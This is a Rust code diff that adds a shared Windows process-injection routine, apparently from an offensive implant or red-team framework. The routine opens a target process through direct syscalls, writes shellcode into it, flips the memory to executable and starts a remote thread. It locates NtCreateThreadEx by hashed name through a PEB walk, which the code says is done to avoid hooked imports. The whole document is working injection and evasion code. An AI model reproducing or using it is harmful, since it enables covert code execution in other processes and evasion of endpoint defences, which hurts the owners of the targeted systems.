@@ -34,6 +34,178 @@ pub trait Injector {
     fn inject(&self, pid: u32, payload: &[u8]) -> anyhow::Result<()>;
 }
 
+/// Shared NtCreateThreadEx-based injection primitive.
+///
+/// This is the common core used by both `RemoteThreadInjector` and
+/// `NtCreateThreadInjector`.  It opens the target process, allocates RW
+/// memory, writes the payload, flips the protection to RX, flushes the
+/// I-cache, and spawns a new thread via `NtCreateThreadEx` (resolved
+/// through `pe_resolve` to avoid hooked imports).
+///
+/// # Arguments
+/// * `pid`         — Target process ID.
+/// * `payload`     — Raw shellcode bytes (PE payloads must be handled by
+///                    the caller before calling this function).
+/// * `access_mask` — Desired access rights for `NtOpenProcess`.
+/// * `label`       — Human-readable label for error messages (e.g. "RemoteThread").
+#[cfg(windows)]
+pub(crate) fn nt_create_thread_inject(
+    pid: u32,
+    payload: &[u8],
+    access_mask: u32,
+    label: &str,
+) -> anyhow::Result<()> {
+    use winapi::um::winnt::{
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, SYNCHRONIZE,
+    };
+
+    // Minimal thread access for NtCreateThreadEx: SYNCHRONIZE only.
+    // The handle is closed immediately after creation (fire-and-forget).
+    const THREAD_ACCESS_MINIMAL: u32 = SYNCHRONIZE;
+
+    // Open target process via NtOpenProcess.
+    let mut client_id = [0u64; 2];
+    client_id[0] = pid as u64;
+    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+
+    unsafe {
+        let mut h_proc: usize = 0;
+        let open_status = syscall!(
+            "NtOpenProcess",
+            &mut h_proc as *mut _ as u64,
+            access_mask as u64,
+            &mut obj_attr as *mut _ as u64,
+            client_id.as_mut_ptr() as u64,
+        );
+        match open_status {
+            Ok(s) if s >= 0 && h_proc != 0 => {}
+            _ => return Err(anyhow::anyhow!("{}: NtOpenProcess failed", label)),
+        }
+        let h_proc = h_proc as *mut std::ffi::c_void;
+
+        macro_rules! close_h {
+            ($h:expr) => {
+                syscall!("NtClose", $h as u64).ok();
+            };
+        }
+        macro_rules! cleanup_and_err {
+            ($msg:expr) => {{
+                close_h!(h_proc);
+                return Err(anyhow::anyhow!($msg));
+            }};
+        }
+
+        // Allocate RW memory.
+        let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
+        let mut alloc_size = payload.len();
+        let s = syscall!(
+            "NtAllocateVirtualMemory",
+            h_proc as u64, &mut remote_mem as *mut _ as u64,
+            0u64, &mut alloc_size as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+        );
+        match s {
+            Ok(st) if st >= 0 => {}
+            _ => cleanup_and_err!("{}: NtAllocateVirtualMemory failed", label),
+        }
+        if remote_mem.is_null() {
+            cleanup_and_err!("{}: NtAllocateVirtualMemory returned null", label);
+        }
+
+        // Write payload.
+        let mut written = 0usize;
+        let s = syscall!(
+            "NtWriteVirtualMemory",
+            h_proc as u64, remote_mem as u64,
+            payload.as_ptr() as u64, payload.len() as u64,
+            &mut written as *mut _ as u64,
+        );
+        match s {
+            Ok(st) if st >= 0 => {}
+            _ => cleanup_and_err!("{}: NtWriteVirtualMemory failed", label),
+        }
+        if written != payload.len() {
+            cleanup_and_err!(
+                "{}: NtWriteVirtualMemory wrote {} of {} bytes",
+                label,
+                written,
+                payload.len()
+            );
+        }
+
+        // Switch to execute-read (no write).
+        let mut old_prot = 0u32;
+        let mut prot_base = remote_mem as usize;
+        let mut prot_size = payload.len();
+        let s = syscall!(
+            "NtProtectVirtualMemory",
+            h_proc as u64, &mut prot_base as *mut _ as u64,
+            &mut prot_size as *mut _ as u64,
+            PAGE_EXECUTE_READ as u64, &mut old_prot as *mut _ as u64,
+        );
+        match s {
+            Ok(st) if st >= 0 => {}
+            _ => cleanup_and_err!("{}: NtProtectVirtualMemory to RX failed", label),
+        }
+
+        // Flush I-cache before creating the new thread.  Required for
+        // correctness on ARM64 and defense-in-depth on x86_64.
+        syscall!(
+            "NtFlushInstructionCache",
+            h_proc as u64, remote_mem as u64, payload.len() as u64,
+        ).ok();
+
+        // Resolve NtCreateThreadEx via PEB walk.
+        let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
+        let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
+            .ok_or_else(|| anyhow::anyhow!("{}: ntdll not found", label))?;
+        let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
+        let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll, fn_hash)
+            .ok_or_else(|| anyhow::anyhow!("{}: NtCreateThreadEx not found", label))?
+            as *mut winapi::ctypes::c_void;
+
+        type NtCreateThreadExFn = unsafe extern "system" fn(
+            *mut *mut winapi::ctypes::c_void,
+            u32,
+            *mut winapi::ctypes::c_void,
+            *mut winapi::ctypes::c_void,
+            *mut winapi::ctypes::c_void,
+            *mut winapi::ctypes::c_void,
+            u32,
+            usize,
+            usize,
+            usize,
+            *mut winapi::ctypes::c_void,
+        ) -> i32;
+        let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);
+
+        // Create the remote thread.
+        let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+        let status = nt_create(
+            &mut h_thread,
+            THREAD_ACCESS_MINIMAL,
+            std::ptr::null_mut(),
+            h_proc,
+            remote_mem,
+            std::ptr::null_mut(),
+            0,
+            0,
+            0,
+            0,
+            std::ptr::null_mut(),
+        );
+        if status < 0 {
+            cleanup_and_err!("{}: NtCreateThreadEx failed: {:x}", label, status);
+        }
+        if !h_thread.is_null() {
+            close_h!(h_thread);
+        }
+        close_h!(h_proc);
+    }
+    Ok(())
+}
+
 #[cfg(windows)]
 pub(crate) fn payload_has_valid_pe_headers(payload: &[u8]) -> bool {
     if payload.len() < 0x40 || payload[0] != b'M' || payload[1] != b'Z' {
